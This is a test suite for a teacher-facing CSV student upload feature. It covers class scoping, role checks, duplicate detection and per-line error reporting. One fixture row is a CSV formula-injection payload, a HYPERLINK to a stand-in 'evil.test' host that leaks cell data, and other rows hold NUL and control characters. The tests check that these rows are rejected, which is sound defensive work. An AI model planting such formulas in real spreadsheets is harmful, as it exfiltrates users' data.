// A teacher adds her students from a CSV file.
//
// ── THE DEFECT ─────────────────────────────────────────────────────────────
//
// "My students" added one child at a time and nothing else: no file, no
// template, so a class list of forty was forty forms. (Found in the 5 Oct 2026
// QA of the teacher flows, D-5.)
//
// ── THE RULE ───────────────────────────────────────────────────────────────
//
// /teaching/students takes name, rollNumber, section and class. The class is
// the label she sees ("Grade 5 A", "Grade 6 (all sections)") or the grade
// ("5"), among HER classes only. The school and the grade of each new student
// come from that class and are never read from the file. A row the file gets
// wrong -- a class she does not teach, a section she does not teach, a missing
// name -- is reported with its line, and the other rows still land. A student
// who is already on the class list, or repeated in the file, is reported and
// not added twice. Teachers only; approvers keep the admin CSV.
//
// Executed: the real route handler, server action and pages on Postgres.

import { test, after } from "node:test";
import assert from "node:assert/strict";
import { createRequire } from "node:module";
import { render, request, withAppRouter } from "./_ui.js";
import { needsDatabase, withClient } from "./_harness.js";
import { form } from "./_admin-fixture.js";
import { closeAppDb, outcome, signIn } from "./_server-actions.js";
import { as, assertDocumented, csvForm, teachingWorld, type TeachingWorld } from "./_teaching-world.js";

const skip = needsDatabase();
const Papa = createRequire(new URL("../../apps/web/package.json", import.meta.url))("papaparse") as {
  parse: <T>(s: string, o: { skipEmptyLines: boolean }) => { data: T[] };
};
after(async () => {
  if (!skip) await closeAppDb();
});

const APP = "../../apps/web/src/app/(authenticated)";
const API = "../../apps/web/src/app/api/teaching";
type State = { error?: string; ok?: string; issues?: string[] } | undefined;

const upload = async (fd: FormData): Promise<State> => {
  const { uploadStudentsCsvAction } = await import(`${APP}/teaching/students/students-csv.ts`);
  return uploadStudentsCsvAction(undefined, fd);
};
const template = async (): Promise<Response> => (await import(`${API}/students/template/route.ts`)).GET(new Request("http://app.test/api/teaching/students/template"));

async function render_(path: string, props?: unknown): Promise<string> {
  const { default: Page } = (await import(`${APP}/${path}`)) as { default: (p?: unknown) => Promise<unknown> };
  const r = await outcome(() => Page(props));
  if (r.kind !== "returned") assert.fail(`${path}: ${JSON.stringify(r)}`);
  return render(withAppRouter(r.value));
}

async function inWorld(body: (w: TeachingWorld) => Promise<void>) {
  await withClient(async (c) => {
    const w = await teachingWorld(c, "tstu");
    try {
      await body(w);
    } finally {
      request.locale = "en";
      await w.f.cleanup();
    }
  });
}

type Row = { name: string; roll_number: string | null; section: string | null; grade: number; school_id: string; class_id: string };
/**
 * This world's learners with these names. Scoped to the world's two schools --
 * where its fixture and every upload here put learners, and what its cleanup
 * removes -- because the behaviour files run in parallel on one database and
 * names repeat across them: unscoped, another file's "Tenzin" (another school,
 * section B, roll 2) answered for this one's.
 */
const learnersOf = async (w: TeachingWorld, names: string[]): Promise<Record<string, Row>> => {
  const { rows } = await w.c.query(
    `SELECT name, roll_number, section, grade, school_id, class_id FROM learners
      WHERE name = ANY($1) AND school_id = ANY($2) AND deleted_at IS NULL`,
    [names, [w.school, w.otherSchool]],
  );
  return Object.fromEntries(rows.map((r) => [r.name as string, r as Row]));
};
const studentsCount = async (w: TeachingWorld, classId: string) =>
  (await w.c.query(`SELECT students_count AS n, (SELECT count(*)::int FROM learners WHERE class_id = $1 AND active AND deleted_at IS NULL) AS real FROM classes WHERE id = $1`, [classId])).rows[0] as {
    n: number;
    real: number;
  };
const total = async (w: TeachingWorld) => (await w.c.query(`SELECT count(*)::int AS n FROM learners WHERE school_id = ANY($1)`, [[w.school, w.otherSchool]])).rows[0].n as number;

test("the template is the header row, for teachers only", { skip }, async () => {
  await inWorld(async (w) => {
    as(w.teacherUser, "teacher");
    const res = await template();
    assert.equal(res.status, 200);
    assert.match(res.headers.get("content-type") ?? "", /^text\/csv/);
    assert.match(res.headers.get("content-disposition") ?? "", /^attachment; filename="[\w.-]+\.csv"$/);
    assert.deepEqual(Papa.parse<string[]>((await res.text()).trim(), { skipEmptyLines: true }).data, [["name", "rollNumber", "section", "class"]]);

    for (const [who, role] of [[w.padmin, "programme_admin"], [w.mentor, "mentor"], [w.observer, "observer"]] as const) {
      as(who, role);
      assert.equal((await template()).status, 403, role);
    }
    signIn(null);
    assert.equal((await template()).status, 401);
  });
});

test("My students offers the upload, the template and her class names", { skip }, async () => {
  await inWorld(async (w) => {
    as(w.teacherUser, "teacher");
    const html = await render_("teaching/students/page.tsx");
    assert.match(html, /Upload students CSV/);
    assert.match(html, /Download template/);
    assert.match(html, /href="\/api\/teaching\/students\/template"/);
    assert.match(html, /type="file"/);
    assert.match(html, /Grade 5 A, Grade 6 \(all sections\)/, "the class values she can write");

    // A teacher with no class has nothing to add students to.
    const lone = await w.f.user("teacher", "lone");
    await w.f.row("teachers", { school_id: w.school, full_name: `Lone ${w.t}`, user_id: lone });
    as(lone, "teacher");
    assert.doesNotMatch(await render_("teaching/students/page.tsx"), /Upload students CSV/);
  });
});

test("a file adds students to her classes, and the school and grade come from the class", { skip }, async () => {
  await inWorld(async (w) => {
    as(w.teacherUser, "teacher");
    const before = await studentsCount(w, w.five);
    assert.equal(before.real, 6);

    const csv = [
      "name,rollNumber,section,class",
      "Pema,11,,Grade 5 A", // her link's own label
      "Rinchen,12,,5", // the grade: her only link to Grade 5 names section A
      "Sonam,13,B,6", // a whole-grade link takes any section
      "Tenzin,,,Grade 6 (all sections)", // ...or none
      "Yangchen,14,,grade 6", // any case
      "",
    ].join("\r\n");
    const done = await upload(csvForm(csv));
    assert.match(done?.ok ?? "", /^5 students added\.$/, JSON.stringify(done));
    assert.equal(done?.issues?.length ?? 0, 0);

    const made = await learnersOf(w, ["Pema", "Rinchen", "Sonam", "Tenzin", "Yangchen"]);
    const where = (r: Row) => [r.class_id === w.five ? "five" : r.class_id === w.six ? "six" : "?", r.grade, r.school_id === w.school, r.section, r.roll_number];
    assert.deepEqual(where(made.Pema!), ["five", 5, true, "A", "11"]);
    assert.deepEqual(where(made.Rinchen!), ["five", 5, true, "A", "12"], "section A: the one she teaches in Grade 5");
    assert.deepEqual(where(made.Sonam!), ["six", 6, true, "B", "13"]);
    assert.deepEqual(where(made.Tenzin!), ["six", 6, true, null, null]);
    assert.deepEqual(where(made.Yangchen!), ["six", 6, true, null, "14"]);

    // The class's student count follows (the trigger), and every view agrees.
    assert.deepEqual(await studentsCount(w, w.five), { n: 8, real: 8 });
    assert.deepEqual(await studentsCount(w, w.six), { n: 3, real: 3 });
    const page = await render_("teaching/students/page.tsx");
    for (const name of ["Pema", "Rinchen", "Sonam", "Tenzin", "Yangchen"]) assert.match(page, new RegExp(name), `${name} is on My students`);
    const repo = await render_("repo/class/[id]/page.tsx", { params: Promise.resolve({ id: w.five }) });
    assert.match(repo, /8 students across/, "the Repository's class page counts them");

    const audit = await w.c.query(`SELECT entity_type, entity_id, metadata FROM audit_log WHERE user_id = $1 AND action = 'teaching.students.imported'`, [w.teacherUser]);
    assert.equal(audit.rowCount, 1);
    assert.equal(audit.rows[0].entity_id, w.teacher);
    assert.deepEqual(audit.rows[0].metadata, { rows: 5, created: 5, rejected: 0, classIds: [w.five, w.six] });
    assert.ok(!JSON.stringify(audit.rows[0].metadata).includes("Pema"), "no names in the audit row (SM-9)");
    assertDocumented("teaching.students.imported", audit.rows[0]);
  });
});

test("a file cannot choose the school, the grade or the class: only her class label does", { skip }, async () => {
  await inWorld(async (w) => {
    as(w.teacherUser, "teacher");
    // The columns an admin import would take, filled with another school's class and a grade she does not teach.
    const csv = [
      "name,schoolId,classId,grade,class",
      `Intruder,${w.otherSchool},${w.otherFive},9,Grade 5 A`,
    ].join("\n");
    const done = await upload(csvForm(csv));
    assert.match(done?.ok ?? "", /1 student added/, JSON.stringify(done));
    const row = (await learnersOf(w, ["Intruder"])).Intruder!;
    assert.equal(row.class_id, w.five);
    assert.equal(row.school_id, w.school, "the school is her class's, not the file's");
    assert.equal(row.grade, 5, "the grade is her class's, not the file's");

    // And a class that is not hers cannot be named at all, by label or by grade.
    const refused = await upload(csvForm(["name,class", "Seven,Grade 7", "Nine,9", `Other,${w.otherFive}`].join("\n")));
    assert.match(refused?.error ?? "", /No rows were imported/);
    assert.equal(refused?.issues?.length, 3);
    for (const line of refused?.issues ?? []) assert.match(line, /is not one of your classes\. Your classes: Grade 5 A, Grade 6 \(all sections\)/);
    assert.equal((await learnersOf(w, ["Seven", "Nine", "Other"])).Seven, undefined);
    assert.equal(await total(w), 6 + 1);
  });
});

test("a row that cannot be added is reported with its line, and the other rows still land", { skip }, async () => {
  await inWorld(async (w) => {
    as(w.teacherUser, "teacher");
    const csv = [
      "name,rollNumber,section,class", // 1
      "Good One,31,,5", // 2  ok
      "Wrong Section,32,B,5", // 3 she teaches section A of Grade 5 only
      "Conflict,33,B,Grade 5 A", // 4 the class says A, the column says B
      ",34,,5", // 5 no name
      `${"L".repeat(161)},35,,5`, // 6 name too long
      `Roll,${"9".repeat(33)},,5`, // 7 roll number too long
      "Bad Section,36,ABCDEFGHI,6", // 8 section too long
      "Nowhere,37,,Grade 12", // 9 not her class
      "Good Two,38,,6", // 10 ok
    ].join("\n");
    const res = await upload(csvForm(csv));
    assert.match(res?.ok ?? "", /2 students added\. 7 rows were not imported:/, JSON.stringify(res));
    assert.deepEqual(Object.keys(await learnersOf(w, ["Good One", "Good Two", "Wrong Section", "Conflict"])).sort(), ["Good One", "Good Two"]);

    const at = (line: number) => (res?.issues ?? []).find((i) => i.startsWith(`Line ${line}:`)) ?? "";
    assert.match(at(3), /do not teach that section/);
    assert.match(at(4), /class says section A but the section column says B/);
    assert.match(at(5), /Enter the student's name/);
    assert.match(at(6), /Name is too long \(at most 160/);
    assert.match(at(7), /Roll number is too long \(at most 32/);
    assert.match(at(8), /at most 8 characters/);
    assert.match(at(9), /"Grade 12" is not one of your classes/);
    assert.deepEqual((res?.issues ?? []).map((i) => Number(/^Line (\d+):/.exec(i)![1])), [3, 4, 5, 6, 7, 8, 9]);
  });
});

test("a student already on the class list, or repeated in the file, is reported and not added twice", { skip }, async () => {
  await inWorld(async (w) => {
    as(w.teacherUser, "teacher");
    // Angmo is in section A (roll 1), Bilal is roll 2; Deskit is in section B.
    const csv = [
      "name,rollNumber,section,class", // 1
      "Fresh,41,,5", // 2  ok
      "angmo,42,,5", // 3  same name, same class and section (case does not matter)
      "Newcomer,2,,5", // 4  roll 2 is Bilal's in section A
      "Fresh,43,,5", // 5  repeats line 2
      "Other Fresh,41,,5", // 6  roll 41 repeats line 2
      "Deskit,44,,Grade 6", // 7  Deskit is in Grade 5 section B, not in this class: fine
    ].join("\n");
    const first = await upload(csvForm(csv));
    assert.match(first?.ok ?? "", /2 students added\. 4 rows were not imported:/, JSON.stringify(first));
    const at = (line: number) => (first?.issues ?? []).find((i) => i.startsWith(`Line ${line}:`)) ?? "";
    assert.match(at(3), /angmo is already in Grade 5 A/);
    assert.match(at(4), /Roll number 2 is already used in Grade 5 A/);
    assert.match(at(5), /Fresh repeats line 2/);
    assert.match(at(6), /Roll number 41 repeats line 2/);
    const count = await total(w);

    // The recovery from a partial import is to upload the whole file again: nothing lands twice.
    const second = await upload(csvForm(csv));
    assert.match(second?.error ?? "", /No rows were imported/, JSON.stringify(second));
    assert.equal(second?.issues?.length, 6);
    assert.equal(await total(w), count, "no student was added a second time");

    // A student she removed (soft-deleted) can be added again.
    await w.c.query(`UPDATE learners SET deleted_at = now(), active = false WHERE id = $1`, [w.chosdol]);
    const again = await upload(csvForm("name,class\nChosdol,5\n"));
    assert.match(again?.ok ?? "", /1 student added/, JSON.stringify(again));
  });
});

test("a link that names a section puts the student there; several such links need the section said", { skip }, async () => {
  await inWorld(async (w) => {
    // The colleague teaches Grade 6 whole, and sections A and B of Grade 5.
    await w.f.row("teacher_classes", { teacher_id: w.other, class_id: w.five, section: "A" });
    await w.f.row("teacher_classes", { teacher_id: w.other, class_id: w.five, section: "B" });
    as(w.otherUser, "teacher");
    const csv = ["name,section,class", "Needs A Section,,5", "In B,b,5", "Not C,C,5", "In Six,Rose,6"].join("\n");
    const res = await upload(csvForm(csv));
    assert.match(res?.ok ?? "", /2 students added\. 2 rows were not imported:/, JSON.stringify(res));
    const made = await learnersOf(w, ["In B", "In Six"]);
    assert.equal(made["In B"]!.section, "B", "a typed b is the section the register calls B");
    assert.equal(made["In Six"]!.section, "ROSE");
    assert.match((res?.issues ?? []).find((i) => i.startsWith("Line 2:")) ?? "", /Say which section: A, B/);
    assert.match((res?.issues ?? []).find((i) => i.startsWith("Line 4:")) ?? "", /do not teach that section/);

    // With one class and no class column, every row goes to it.
    await w.c.query(`DELETE FROM teacher_classes WHERE teacher_id = $1 AND class_id = $2`, [w.other, w.five]);
    const one = await upload(csvForm("name\nSolo\n"));
    assert.match(one?.ok ?? "", /1 student added/, JSON.stringify(one));
    assert.equal((await learnersOf(w, ["Solo"])).Solo!.class_id, w.six);
  });
});

test("a colleague's classes are not hers, and a student she adds is not on the colleague's list", { skip }, async () => {
  await inWorld(async (w) => {
    // `other` is linked to Grade 6 only: she cannot add to Grade 5, which the first teacher teaches.
    as(w.otherUser, "teacher");
    const res = await upload(csvForm("name,class\nSneaky,5\nHonest,6\n"));
    assert.match(res?.ok ?? "", /1 student added\. 1 row was not imported:/, JSON.stringify(res));
    assert.match(res?.issues?.[0] ?? "", /^Line 2: "5" is not one of your classes\. Your classes: Grade 6 \(all sections\)\.$/);
    const made = await learnersOf(w, ["Sneaky", "Honest"]);
    assert.equal(made.Sneaky, undefined);
    assert.equal(made.Honest!.class_id, w.six);
  });
});

test("every other role, and a teacher with nothing to add to, is turned away", { skip }, async () => {
  await inWorld(async (w) => {
    const csv = csvForm("name,class\nNobody,5\n");
    for (const [who, role] of [[w.padmin, "programme_admin"], [w.mentor, "mentor"], [w.observer, "observer"]] as const) {
      as(who, role);
      assert.match((await upload(csvForm("name,class\nNobody,5\n")))?.error ?? "", /Only teachers/, role);
    }
    const noRow = await w.f.user("teacher", "norow"); // a teacher account with no teachers row
    as(noRow, "teacher");
    assert.match((await upload(csv))?.error ?? "", /not linked to a teacher record/);
    const lone = await w.f.user("teacher", "lone");
    await w.f.row("teachers", { school_id: w.school, full_name: `Lone ${w.t}`, user_id: lone });
    as(lone, "teacher");
    assert.match((await upload(csvForm("name,class\nNobody,5\n")))?.error ?? "", /Add a class first/);
    assert.deepEqual(await learnersOf(w, ["Nobody"]), {});
  });
});

test("a file with no usable shape writes nothing and says why", { skip }, async () => {
  await inWorld(async (w) => {
    as(w.teacherUser, "teacher");
    const err = async (fd: FormData) => (await upload(fd))?.error ?? "";
    assert.match(await err(form({})), /Choose a CSV file first/);
    assert.match(await err(csvForm("")), /Choose a CSV file first/);
    assert.match(await err(csvForm("name,class\n")), /no rows to import/);
    assert.match(await err(csvForm("rollNumber,class\n1,5\n")), /needs a name column/);
    assert.match(await err(csvForm("name,rollNumber\nAsha,1\n")), /needs a class column/, "she teaches two classes: a row has to say which");
    assert.match(await err(csvForm('name,class\n"Asha,5\n')), /could not be read as a CSV/);
    const rows = Array.from({ length: 1001 }, (_, i) => `S${i},5`).join("\n");
    assert.match(await err(csvForm(`name,class\n${rows}`)), /more than 1000 rows/);
    assert.match(await err(csvForm(`name,class\n${"x".repeat(600 * 1024)}`)), /too large/);
    assert.equal(await total(w), 6, "nothing was added by any of these");
  });
});

test("the class can be written as her page shows it, in her language", { skip }, async () => {
  await inWorld(async (w) => {
    as(w.teacherUser, "teacher");
    request.locale = "hi";
    const res = await upload(csvForm("name,class\nहिंदी एक,कक्षा 5 A\nहिंदी दो,कक्षा 6 (सभी सेक्शन)\nहिंदी तीन,कक्षा 6\n"));
    assert.equal(res?.error, undefined, JSON.stringify(res));
    const made = await learnersOf(w, ["हिंदी एक", "हिंदी दो", "हिंदी तीन"]);
    assert.deepEqual(Object.values(made).map((r) => [r.grade, r.section]).sort(), [[5, "A"], [6, null], [6, null]]);
  });
});

// ── Review findings on this feature (second round) ──────────────────────────
//
// Found by independent reviewers of the first version; each test below failed
// against it. A student with no section is on EVERY section's roster
// (lib/teaching roster()), so for "already on the class list" a missing section
// overlaps all of them; and a cell is one line of text, so a file that smuggles
// in a line break (a formula that survives the roster download) or a NUL byte
// (which Postgres refuses, sinking the whole batch) is that row's problem.

const kid = (w: TeachingWorld, name: string, roll: string | null, section: string | null) =>
  w.f.row("learners", { class_id: w.six, school_id: w.school, grade: 6, name, roll_number: roll, section });

test("a student without a section overlaps every section of the class: not added twice", { skip }, async () => {
  await inWorld(async (w) => {
    await kid(w, "Pema", "9", "A");
    await kid(w, "Quinn", "8", null);
    as(w.teacherUser, "teacher");

    const csv = [
      "name,rollNumber,section,class", // 1
      "Pema,,,Grade 6 (all sections)", // 2  Pema is in section A already; no section here means "every section"
      "Newcomer,9,,Grade 6 (all sections)", // 3  roll 9 is Pema's, in A
      "Quinn,,A,6", // 4  Quinn is in no section, so also in A
      "Other,8,B,6", // 5  roll 8 is Quinn's, in every section
      "Pema,,B,6", // 6  a Pema of section B is another child: fine
      "Zed,,A,6", // 7  fine
      "Zed,,,6", // 8  no section overlaps Zed of A on line 7
    ].join("\n");
    const res = await upload(csvForm(csv));
    assert.match(res?.ok ?? "", /^2 students added\. 5 rows were not imported:/, JSON.stringify(res));
    const at = (line: number) => (res?.issues ?? []).find((i) => i.startsWith(`Line ${line}:`)) ?? "";
    assert.match(at(2), /Pema is already in Grade 6 A\./, "it says where the Pema on the list is");
    assert.match(at(3), /Roll number 9 is already used in Grade 6 A\./);
    assert.match(at(4), /Quinn is already in Grade 6\./);
    assert.match(at(5), /Roll number 8 is already used in Grade 6\./);
    assert.match(at(8), /Zed repeats line 7\./);
    assert.deepEqual((res?.issues ?? []).map((i) => Number(/^Line (\d+):/.exec(i)![1])), [2, 3, 4, 5, 8]);
    assert.deepEqual(
      (await w.c.query(`SELECT name, section FROM learners WHERE class_id = $1 AND deleted_at IS NULL AND name IN ('Pema', 'Zed') ORDER BY name, section`, [w.six])).rows,
      [{ name: "Pema", section: "A" }, { name: "Pema", section: "B" }, { name: "Zed", section: "A" }],
    );
  });
});

test("a line break or another control character in a cell is that row's problem, and the other rows still land", { skip }, async () => {
  await inWorld(async (w) => {
    as(w.teacherUser, "teacher");
    const csv = [
      "name,rollNumber,section,class", // 1
      "Good One,61,,5", // 2
      '"Bad\u0000Name",62,,5', // 3  a NUL byte: Postgres refuses it, and with it the whole batch
      `"=HYPERLINK(""http://evil.test/?""&B2,\n""click"")",63,,5`, // 4  a formula that spans lines survives the roster download
      '"Tab\tName",64,,5', // 5
      'Roll,"6\u00075",,5', // 6  a control character in the roll number
      'Section,66,"A\u0000",5', // 7 ...and in the section
      "Good Two,67,,5", // 8
    ].join("\n");
    const res = await upload(csvForm(csv));
    assert.match(res?.ok ?? "", /^2 students added\. 5 rows were not imported:/, JSON.stringify(res));
    assert.deepEqual(Object.keys(await learnersOf(w, ["Good One", "Good Two"])).sort(), ["Good One", "Good Two"]);
    assert.deepEqual((res?.issues ?? []).map((i) => Number(/^Line (\d+):/.exec(i)![1])), [3, 4, 5, 6, 7]);
    for (const line of res?.issues ?? []) assert.match(line, /line break or another character that cannot be used/);
    assert.equal(await total(w), 6 + 2, "nothing else was stored");
  });
});

test("a workbook or a UTF-16 file is told to be saved as CSV, not told its columns are missing", { skip }, async () => {
  await inWorld(async (w) => {
    as(w.teacherUser, "teacher");
    const xlsx = `PK\u0003\u0004${"\u0000".repeat(40)}[Content_Types].xml`;
    const utf16 = [..."name,class\nAsha,5\n"].join("\u0000");
    for (const [name, content] of [["students.xlsx", xlsx], ["students.csv", utf16]] as const) {
      const err = (await upload(csvForm(content, {}, name)))?.error ?? "";
      assert.match(err, /not a plain CSV/, name);
      assert.match(err, /Save as/, name);
    }
    assert.equal(await total(w), 6);
  });
});

test("the template opens in Excel as UTF-8", { skip }, async () => {
  await inWorld(async (w) => {
    as(w.teacherUser, "teacher");
    const bytes = new Uint8Array(await (await template()).arrayBuffer());
    assert.deepEqual([...bytes.slice(0, 3)], [0xef, 0xbb, 0xbf], "a byte order mark: names she types into it in Devanagari or Tibetan must not turn to mojibake");
    // (String.trim() would drop the mark itself: U+FEFF counts as white space.)
    assert.equal(new TextDecoder("utf-8", { ignoreBOM: true }).decode(bytes).replace(/\r?\n$/, ""), "﻿name,rollNumber,section,class");
  });
});
